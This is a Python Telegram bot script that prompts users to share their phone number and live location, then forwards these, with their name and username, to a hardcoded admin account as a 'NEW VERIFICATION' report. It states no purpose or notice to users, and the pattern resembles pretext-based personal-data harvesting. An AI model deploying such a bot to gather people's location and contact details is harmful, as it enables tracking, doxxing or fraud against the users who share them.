import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# Bot setup
TOKEN = "YOUR_BOT_TOKEN"  # Will be replaced via GitHub Secrets
ADMIN_ID = 6970602498  # Your Telegram ID

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Conversation states
PHONE, LOCATION = range(2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Please share your phone number:",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("📱 Share Phone", request_contact=True)]],
            resize_keyboard=True
        )
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.contact.phone_number if update.message.contact else update.message.text
    context.user_data['phone'] = phone
    await update.message.reply_text(
        "📍 Now share your location:",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("📍 Share Location", request_location=True)]],
            resize_keyboard=True
        )
    )
    return LOCATION

async def get_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    location = update.message.location
    user = update.message.from_user
    
    report = (
        "✅ NEW VERIFICATION\n"
        f"👤 Name: {user.full_name}\n"
        f"📱 Phone: {context.user_data['phone']}\n"
        f"📍 Map: https://maps.google.com/?q={location.latitude},{location.longitude}\n"
        f"🆔 Username: @{user.username or 'N/A'}"
    )
    
    await update.message.reply_text("Thank you!", reply_markup=ReplyKeyboardRemove())
    await context.bot.send_message(ADMIN_ID, report)
    return ConversationHandler.END

def main():
    app = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, get_phone)],
            LOCATION: [MessageHandler(filters.LOCATION, get_location)]
        },
        fallbacks=[]
    )
    
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == '__main__':
    main()
